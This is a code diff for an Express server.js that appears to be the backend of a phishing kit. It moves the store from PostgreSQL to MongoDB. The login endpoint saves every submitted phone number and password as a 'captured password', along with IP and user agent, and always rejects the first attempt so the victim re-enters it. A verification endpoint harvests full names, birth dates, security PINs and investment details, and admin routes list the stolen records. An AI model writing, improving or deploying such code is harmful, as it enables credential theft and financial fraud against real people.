@@ -1,120 +1,90 @@
 // server.js
 const express = require('express');
-const { Pool } = require('pg');
-const path = require('path');
-require('dotenv').config(); // Load environment variables from .env file
+const mongoose = require('mongoose');
+const path = path = require('path');
+require('dotenv').config();
 
 const app = express();
-const port = process.env.PORT || 3000;
-
-// PostgreSQL connection using environment variables
-const pool = new Pool({
-    user: process.env.DB_USER,
-    host: process.env.DB_HOST,
-    database: process.env.DB_DATABASE,
-    password: process.env.DB_PASSWORD,
-    port: process.env.DB_PORT,
-});
+const port = process.env.PORT || 10000;
 
 // Middleware
 app.use(express.json());
-app.use(express.static('public'));
-app.use('/uploads', express.static('uploads'));
+// IMPORTANT: Serve static files from a 'public' folder
+app.use(express.static(path.join(__dirname, 'public')));
+app.use('/uploads', express.static(path.join(__dirname, 'uploads')));
 
-// Create tables if they don't exist
-async function initializeDatabase() {
-    try {
-        // Table for captured passwords
-        await pool.query(`
-            CREATE TABLE IF NOT EXISTS captured_passwords (
-                id SERIAL PRIMARY KEY,
-                user_id VARCHAR(50) NOT NULL,
-                password VARCHAR(255) NOT NULL,
-                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                user_agent TEXT,
-                ip_address INET,
-                attempt_number INTEGER DEFAULT 1
-            )
-        `);
 
-        // UPDATED Table for user verification data
-        await pool.query(`
-            CREATE TABLE IF NOT EXISTS user_verifications (
-                id SERIAL PRIMARY KEY,
-                user_id VARCHAR(50) NOT NULL,
-                full_name VARCHAR(100),
-                date_of_birth DATE,
-                problem VARCHAR(100),
-                security_pin VARCHAR(6),
-                investment_experience VARCHAR(50),
-                captured_password VARCHAR(255),
-                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-            )
-        `);
+// --- Connect to MongoDB Atlas ---
+// This block reads your MONGODB_URI from Render's environment variables
+mongoose.connect(process.env.MONGODB_URI, {
+    useNewUrlParser: true,
+    useUnifiedTopology: true,
+}).then(() => {
+    console.log('Successfully connected to MongoDB Atlas');
+}).catch(err => {
+    // This will now show a more useful error if the connection string is wrong
+    console.error('Error connecting to MongoDB Atlas:', err.message); 
+});
 
-        console.log('Database tables initialized successfully');
-    } catch (error) {
-        console.error('Database initialization error:', error);
-    }
-}
+// --- Define MongoDB Schemas and Models ---
+const passwordSchema = new mongoose.Schema({
+    userId: String,
+    password: String,
+    timestamp: { type: Date, default: Date.now },
+    userAgent: String,
+    ipAddress: String,
+    attemptNumber: Number,
+});
 
-// Initialize database on startup
-initializeDatabase();
+const verificationSchema = new mongoose.Schema({
+    userId: String,
+    fullName: String,
+    dob: Date,
+    problem: String,
+    pin: String,
+    experience: String,
+    capturedPassword: String,
+    createdAt: { type: Date, default: Date.now },
+});
 
-// API endpoint for login (mock response)
+const CapturedPassword = mongoose.model('CapturedPassword', passwordSchema);
+const UserVerification = mongoose.model('UserVerification', verificationSchema);
+
+// --- API Routes (now using Mongoose) ---
 app.post('/api/login', async (req, res) => {
     try {
         const { phone, password, attemptNumber } = req.body;
-        
-        const ipAddress = req.ip || req.connection.remoteAddress;
-        const userAgent = req.headers['user-agent'];
-        
-        await pool.query(
-            `INSERT INTO captured_passwords (user_id, password, user_agent, ip_address, attempt_number) 
-             VALUES ($1, $2, $3, $4, $5)`,
-            [phone, password, userAgent, ipAddress, attemptNumber]
-        );
+        const newPassword = new CapturedPassword({
+            userId: phone,
+            password,
+            attemptNumber,
+            userAgent: req.headers['user-agent'],
+            ipAddress: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
+        });
+        await newPassword.save();
 
         if (attemptNumber === 1) {
-            res.json({ success: false, message: 'Incorrect password. Please try again.' });
-        } else {
-            res.json({ success: true, message: 'Login successful', user: { id: phone, phone: phone } });
+            return res.json({ success: false, message: 'Incorrect password. Please try again.' });
         }
+        res.json({ success: true, message: 'Login successful', user: { id: phone, phone } });
     } catch (error) {
         console.error('Login error:', error);
         res.status(500).json({ success: false, error: 'Login failed' });
     }
 });
 
-// UPDATED API endpoint for verification form
 app.post('/api/verification', async (req, res) => {
     try {
-        const {
-            userId,
-            fullName,
-            dob,
-            problem,
-            pin,
-            experience,
-            capturedPassword
-        } = req.body;
-
-        const result = await pool.query(
-            `INSERT INTO user_verifications 
-             (user_id, full_name, date_of_birth, problem, security_pin, investment_experience, captured_password) 
-             VALUES ($1, $2, $3, $4, $5, $6, $7) RETURNING id`,
-            [userId, fullName, dob, problem, pin, experience, capturedPassword]
-        );
-
-        console.log(`Verification data saved for user ${userId}`);
-        res.json({ success: true, message: 'Verification submitted successfully', id: result.rows[0].id });
+        const newVerification = new UserVerification(req.body);
+        await newVerification.save();
+        res.json({ success: true, message: 'Verification submitted successfully!' });
     } catch (error) {
         console.error('Verification error:', error);
         res.status(500).json({ success: false, error: 'Failed to save verification data' });
     }
 });
 
-// NEW Admin login endpoint (secure)
+// --- Admin Routes (now using Mongoose) ---
 app.post('/admin/login', (req, res) => {
     const { password } = req.body;
     if (password && password === process.env.ADMIN_MASTER_PASSWORD) {
@@ -124,82 +94,37 @@ app.post('/admin/login', (req, res) => {
     }
 });
 
-// Admin endpoint to view captured data
 app.get('/admin/captured-passwords', async (req, res) => {
     try {
-        const result = await pool.query('SELECT * FROM captured_passwords ORDER BY timestamp DESC');
-        res.json(result.rows);
+        const passwords = await CapturedPassword.find().sort({ timestamp: -1 });
+        res.json(passwords);
     } catch (error) {
-        console.error('Error fetching passwords:', error);
         res.status(500).json({ error: 'Failed to fetch data' });
     }
 });
 
-// Admin endpoint to view verification data
 app.get('/admin/verifications', async (req, res) => {
     try {
-        const result = await pool.query('SELECT * FROM user_verifications ORDER BY created_at DESC');
-        res.json(result.rows);
-    } catch (error) {
-        console.error('Error fetching verifications:', error);
+        const verifications = await UserVerification.find().sort({ createdAt: -1 });
+        res.json(verifications);
+    } catch(error) {
         res.status(500).json({ error: 'Failed to fetch data' });
     }
 });
 
-// Delete endpoints... (no changes needed here)
-app.delete('/admin/delete-password/:id', async (req, res) => {
-    try {
-        const { id } = req.params;
-        await pool.query('DELETE FROM captured_passwords WHERE id = $1', [id]);
-        res.json({ success: true, message: 'Password entry deleted' });
-    } catch (error) {
-        console.error('Error deleting password:', error);
-        res.status(500).json({ error: 'Failed to delete entry' });
-    }
+
+// --- Serve Frontend Files ---
+// This ensures that your index.html and admin.html are served correctly
+app.get('/admin', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
 });
 
-app.delete('/admin/delete-verification/:id', async (req, res) => {
-    try {
-        const { id } = req.params;
-        await pool.query('DELETE FROM user_verifications WHERE id = $1', [id]);
-        res.json({ success: true, message: 'Verification entry deleted' });
-    } catch (error) {
-        console.error('Error deleting verification:', error);
-        res.status(500).json({ error: 'Failed to delete entry' });
-    }
-});
-
-app.delete('/admin/clear-passwords', async (req, res) => {
-    try {
-        await pool.query('DELETE FROM captured_passwords');
-        res.json({ success: true, message: 'All password entries cleared' });
-    } catch (error) {
-        console.error('Error clearing passwords:', error);
-        res.status(500).json({ error: 'Failed to clear data' });
-    }
-});
-
-app.delete('/admin/clear-verifications', async (req, res) => {
-    try {
-        await pool.query('DELETE FROM user_verifications');
-        res.json({ success: true, message: 'All verification entries cleared' });
-    } catch (error) {
-        console.error('Error clearing verifications:', error);
-        res.status(500).json({ error: 'Failed to clear data' });
-    }
-});
-
-
-// Serve the main page
-app.get('/', (req, res) => {
+app.get('*', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Admin panel
-app.get('/admin', (req, res) => {
-    res.sendFile(path.join(__dirname, 'admin.html'));
-});
 
 app.listen(port, () => {
-    console.log(`Server running at http://localhost:${port}`);
+    console.log(`Server is running on port ${port}`);
 });
+```
